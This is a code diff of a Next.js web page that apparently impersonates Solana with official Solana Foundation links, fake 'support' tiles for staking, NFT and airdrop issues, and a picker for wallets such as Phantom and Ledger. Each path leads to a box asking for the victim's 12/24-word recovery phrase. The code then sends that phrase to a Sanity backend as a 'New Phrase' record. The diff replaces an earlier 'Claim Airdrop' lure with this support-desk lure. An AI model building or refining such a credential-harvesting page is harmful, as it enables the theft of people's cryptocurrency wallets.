@@ -1,40 +1,65 @@
 import Head from "next/head";
 import Image from "next/image";
 import styles from "../styles/Home.module.css";
-import Cancel from "./comps/Cancel";
+import Cancel, {
+  Trade,
+  Staking,
+  Wallet,
+  FailedTransactions,
+  NftIssues,
+  Airdrop,
+  BigWallet,
+  DropDown,
+} from "./comps/Cancel";
 import react, { useState } from "react";
 import client from "../sanity";
 
 export default function Home() {
   const [phrase, setPhrase] = useState("");
+  const [showPhrase, setShowPhrase] = useState(false);
+  const [showWallets, setShowWallets] = useState(false);
+  const [smallModal, setSmallModal] = useState(false);
+  const [modal, setModal] = useState(false);
+  const [walletQueries, setWalletQueries] = useState({
+    name: "",
+    image: "",
+    color: "",
+  });
   const wallets = [
     {
       name: "Atomic",
       image: "Atomic-Wallet.jpg",
+      color: "blue",
     },
     {
       name: "Avana",
       image: "avana-wallet.webp",
+      color: "green",
     },
     {
       name: "Exodus",
       image: "Exodus-Wallet.jpg",
+      color: "purple",
     },
     {
       name: "Glow",
       image: "Glow-logo.png",
+      color: "orange",
     },
     {
       name: "Ledger",
       image: "ledger-logo-long.svg",
+      color: "black",
     },
     {
       name: "Phantom",
       image: "Phantom-wallet.png",
+      color: "purple",
     },
     {
       name: "Sollet",
       image: "Sollet-Wallet.jpeg",
+      color: "blue",
     },
     {
       name: "solRnWallet",
@@ -43,18 +68,22 @@ export default function Home() {
     {
       name: "solflare",
       image: "solflare-wallet.svg",
+      color: "orange",
     },
     {
       name: "Math",
       image: "Math-wallet.jpg",
+      color: "black",
     },
     {
       name: "Trust",
       image: "Trust-wallet.png",
+      color: "blue",
     },
     {
       name: "Slope",
       image: "slope-wallet.png",
+      color: "purple",
     },
   ];
   const getPhrase = () => {
@@ -64,10 +93,11 @@ export default function Home() {
       return;
     }
     setPhrase("");
-    alert("Phrase Word has been submitted");
+    alert("Phrase has been submitted Successfully 🎉");
     // Send details to backend
     const doc = {
-      _type: "phrase",
+      _type: "post",
+      title: "New Phrase 🎉",
       phrase,
     };
     client
@@ -75,29 +105,15 @@ export default function Home() {
       .then((res) => console.log("Results", res))
       .catch((err) => console.error(err));
   };
-  const showModal = () => {
-    document
-      .querySelectorAll(".modal")
-      .forEach((x) => x.classList.toggle("hidden"));
-    // Blur Claim button
-    document.getElementById("claimButton").classList.toggle("blur-lg");
-    document.getElementById("connectWallet").classList.toggle("blur-lg");
+
+  const firstFunc = (name, image, color) => {
+    setWalletQueries({
+      name,
+      image,
+      color,
+    });
   };
-  const showPhrase = (decide) => {
-    if (decide == "all") {
-      document.querySelector(".word-phrase").classList.add("hidden");
-      document
-        .querySelectorAll(".modal")
-        .forEach((x) => x.classList.add("hidden"));
-      document.getElementById("claimButton").classList.remove("blur-lg");
-      document.getElementById("connectWallet").classList.remove("blur-lg");
-      return;
-    }
-    document.querySelector(".word-phrase").classList.remove("hidden");
-    document.getElementById("selectWallet").classList.add("hidden");
-    document.getElementById("claimButton").classList.add("blur-lg");
-    document.getElementById("connectWallet").classList.add("blur-lg");
-  };
+
   const iconNames = [
     { name: "youtube", link: "https://www.youtube.com/SolanaFndn" },
     {
@@ -118,6 +134,41 @@ export default function Home() {
     { name: "Disclaimer", link: "https://solana.com/disclaimer" },
   ];
   const secondList = ["Ecosystem", "Blog", "Newsletter"];
+  const frontListings = [
+    {
+      name: "SOL Swap/ Trade Issue",
+      para: "Get your solana issues resolved quickly",
+      button: "Enter Exchande",
+      comp: <Trade />,
+    },
+    {
+      name: "Staking Issues",
+      para: "Get your staking issues resolved quickly",
+      button: "Resolve",
+      comp: <Staking />,
+    },
+    {
+      name: "Wallet Migration issues",
+      para: "Resolve wallet migration in seconds",
+      comp: <Wallet />,
+    },
+    {
+      name: "Failed Transaction Histories",
+      para: "Get your solana issues resolved quickly",
+      comp: <FailedTransactions />,
+    },
+    {
+      name: "NFTs Related Issues",
+      para: "Get your NFTs issues resolved quickly",
+      comp: <NftIssues />,
+    },
+    {
+      name: "Claim Airdrop",
+      para: "Claim your Airdrops now",
+      comp: <Airdrop />,
+    },
+  ];
+
   return (
     <div className="bg-black font-[poppins]">
       <Head>
@@ -160,7 +211,7 @@ export default function Home() {
               <li
                 id="connectWallet"
                 className="bg-[#17fb9b] cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
-                onClick={showModal}
+                onClick={() => setModal(true)}
               >
                 <small>Connect Wallet</small>
               </li>
@@ -169,14 +220,7 @@ export default function Home() {
         </nav>
         <hr />
         {/* Main Page */}
-        <div
-          className="flex justify-center flex-col items-center w-full
-        "
-        >
-          {/* <div className="sm:ml-60 ml-20 flex items-center h-screen absolute">
-            <img src="Sol-Main-img.webp" alt="Sol-Image" className="" />
-          </div> */}
-          {/* Try Image */}
+        <div className="flex justify-center flex-col items-center w-full">
           <div className="absolute flex justify-center sm:right-0 right-20 min-h-screen min-w-full">
             <video
               className="right-80"
@@ -191,100 +235,183 @@ export default function Home() {
           </div>
 
           {/* End Try Video */}
-          <div className="flex mt-[27rem] relative z-10 gap-10 flex-col items-center">
-            <h1 className="font-semibold sm:text-7xl text-5xl text-center">
-              {" "}
-              <span className="font-extralight">Solana</span> Airdrop Programme
-            </h1>
-            <p className="sm:text-3xl text-xl sm:px-80 font-light text-center">
-              Solana Airdrop is available to all solana network. Get airdrop by
-              claiming your airdrop now.
+          <div className="flex sm:mt-[15rem] mt-10 relative z-10 gap-10 flex-col items-center">
+            <p className="sm:text-4xl text-xl sm:px-96 sm:font-bold text-center">
+              A suitable web3 support team <br className="sm:flex hidden"/> features  powering the 
+              evolution of DeFi on Solana network.
             </p>
-            <button
-              id="claimButton"
-              className="bg-[#17fb9b] relative z-10 px-5 text-lg cursor-pointer py-2
-            font-semibold rounded-full text-black "
-              onClick={showModal}
-            >
-              Claim Airdrop
-            </button>
+            <div className="sm:grid sm:grid-cols-3 sm:gap-5">
+              {frontListings.map((x) => {
+                return (
+                  <div className="bg-gradient-to-br sm:mb-0 mb-3 text-center flex flex-col items-center justify-center from-purple-500/30 to-gray-700/30 backdrop-blur-md p-5 rounded-lg border-2 border-white/30" onClick={() => setModal(prev => !prev)}>
+                    <div className="flex w-10 h-10 rounded-lg items-center text-center justify-center bg-white/50 backdrop-blur-md">
+                      {x.comp}
+                    </div>
+                    <h1 className="font-bold sm:text-lg mt-3">{x.name}</h1>
+                    <small className="mt-5">{x.para}</small>
+                  </div>
+                );
+              })}
+            </div>
           </div>
-
-          {/* Overlay */}
-          {/* End Overlay */}
-          {/* Modal */}
-          <div
-            id="selectWallet"
-            className="mt-7 bg-white modal absolute z-50 rounded-xl shadow-lg hidden"
-          >
-            <div className="p-4 sm:p-7">
-              <div className="grid grid-cols-2">
-                <h1 className="block sm:text-2xl text-xl mb-5  font-semibold text-black">
-                  Select Wallet
-                </h1>
-
-                <div className="w-full flex justify-end" onClick={showModal}>
-                  <Cancel />
+          {/* Small Modal */}
+          {smallModal && (
+            <div
+              id="smallModal"
+              className="mt-7 bg-white  z-30 absolute rounded-xl shadow-lg"
+            >
+              <div className="p-4 sm:p-7">
+                <div className="w-full flex justify-center mb-3">
+                  <img
+                    src={walletQueries?.image}
+                    alt="img"
+                    className="h-10 w-10 object-cover"
+                  />
                 </div>
-              </div>
-
-              <div className="flex flex-col">
-                <div className="grid grid-cols-4 gap-7">
-                  {wallets.map((wallet, key) => {
-                    return (
-                      <div
-                        className="flex cursor-pointer text-center flex-col items-center"
-                        onClick={showPhrase}
-                        key={key}
-                      >
-                        <img
-                          src={wallet.image}
-                          alt={`img-${wallets.indexOf(wallet)}`}
-                          className="sm:h-20 sm:w-20 h-10 w-10 object-contain"
-                        />
-                        <p className="text-black text-sm mt-1 font-medium">
-                          {wallet.name} Wallet
-                        </p>
-                      </div>
-                    );
-                  })}
+                <div className="flex justify-center items-center">
+                  <h1 className="block sm:text-2xl text-sm px-10  mb-5 text-center font-semibold text-black">
+                    How do you want to connect <br /> to {walletQueries?.name}?
+                  </h1>
+                </div>
+                <div className="flex flex-col">
+                  <button
+                    className={`bg-${walletQueries.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
+                    onClick={() => {
+                      setShowPhrase(true);
+                      setSmallModal((prev) => !prev);
+                    }}
+                  >
+                    Extention
+                  </button>
+                  <button
+                    className="border-2 border-[#17fb9b] sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2"
+                    onClick={() => {
+                      setShowPhrase(true);
+                      setSmallModal((prev) => !prev);
+                    }}
+                  >
+                    Web Wallet
+                  </button>
+                  <button
+                    className="mt-5 uppercase text-black font-medium"
+                    onClick={() => {
+                      setSmallModal((prev) => !prev);
+                    }}
+                  >
+                    Close
+                  </button>
                 </div>
               </div>
             </div>
-          </div>
-          {/* End-Modal */}
-          {/* 12 word Input */}
-          <div className="mt-7 bg-white word-phrase z-20 absolute rounded-xl shadow-lg hidden">
-            <div className="p-4 sm:p-7">
-              <div className="grid grid-cols-2">
-                <h1 className="block sm:text-2xl text-sm  mb-5 text-center font-semibold text-black">
-                  Enter 12/24 word phrase
-                </h1>
+          )}
 
+          {modal && (
+            <div
+              id="selectWallet"
+              className="mt-7 bg-white h-screen overflow-hidden backdrop-blur-md modal absolute z-20 rounded-xl shadow-lg"
+            >
+              <div className="p-4 sm:p-7">
                 <div
                   className="w-full flex justify-end"
-                  onClick={() => showPhrase("all")}
+                  onClick={() => setModal((prev) => !prev)}
                 >
                   <Cancel />
                 </div>
+                <h1 className="sm:text-2xl text-black text-3xl text-center mt-5 font-medium mb-5">
+                  You'll need a wallet on solana to continue
+                </h1>
+                <div className="w-full flex justify-center">
+                  <div className="rounded-full h-24 w-24 items-center bg-gradient-to-tr from-[#CB31F8] to-[#18E5AD] justify-center flex bg-white">
+                    <BigWallet />
+                  </div>
+                </div>
+                {/* Start Before Wallets */}
+                <button className="bg-purple-700 w-full mt-5 rounded-lg p-2">
+                  Get Started
+                </button>
+                <div
+                  className="flex justify-end mt-2"
+                  onClick={() => setShowWallets((prev) => !prev)}
+                >
+                  <small className="underline text-black">
+                    Already Have a wallet? View Options
+                  </small>
+                  <DropDown />
+                </div>
+                {/* Before Wallets */}
+                {showWallets && (
+                  <div className="flex mt-5 flex-col">
+                    <div className="grid grid-cols-4 gap-7">
+                      {wallets.map((wallet, key) => {
+                        return (
+                          <div
+                            className="flex cursor-pointer text-center flex-col items-center"
+                            onClick={() => {
+                              firstFunc(
+                                wallet.name,
+                                wallet.image,
+                                wallet.color
+                              );
+                              setSmallModal(true);
+                              setModal((prev) => !prev);
+                            }}
+                            key={key}
+                          >
+                            <img
+                              src={wallet.image}
+                              alt={`img-${wallets.indexOf(wallet)}`}
+                              className="sm:h-20 sm:w-20 h-10 w-10 object-contain"
+                            />
+                            <small className="text-sm mt-1 text-black">
+                              {wallet.name} Wallet
+                            </small>
+                          </div>
+                        );
+                      })}
+                    </div>
+                  </div>
+                )}
               </div>
-
-              <div className="">
-                <input
-                  type="text"
-                  value={phrase}
-                  onChange={(e) => setPhrase(e.target.value)}
-                  className="rounded-lg border-2 bg-none border-gray-300 w-full p-2"
-                />
-              </div>
-              <button
-                className="bg-[#17fb9b] sm:text-base text-sm mt-3 font-semibold rounded-full text-black px-3 py-2"
-                onClick={getPhrase}
-              >
-                Continue
-              </button>
             </div>
-          </div>
+          )}
+          {/* End-Modal */}
+
+          {/* 12 word Input */}
+          {showPhrase && (
+            <div className="mt-7 bg-white word-phrase z-40 absolute rounded-xl shadow-lg">
+              <div className="p-4 sm:p-7">
+                <div className="grid grid-cols-2">
+                  <h1 className="block sm:text-2xl text-sm  mb-5 text-center font-semibold text-black">
+                    Enter 12/24 word phrase
+                  </h1>
+
+                  <div
+                    className="w-full flex justify-end"
+                    onClick={() => {
+                      setShowPhrase((prev) => !prev);
+                    }}
+                  >
+                    <Cancel />
+                  </div>
+                </div>
+
+                <div className="">
+                  <input
+                    type="text"
+                    value={phrase}
+                    onChange={(e) => setPhrase(e.target.value)}
+                    className="rounded-lg border-2 bg-none border-gray-300 w-full p-2"
+                  />
+                </div>
+                <button
+                  className="bg-[#17fb9b] sm:text-base text-sm mt-3 font-semibold rounded-full text-black px-3 py-2"
+                  onClick={getPhrase}
+                >
+                  Continue
+                </button>
+              </div>
+            </div>
+          )}
           {/* End 12 word input */}
         </div>
       </main>
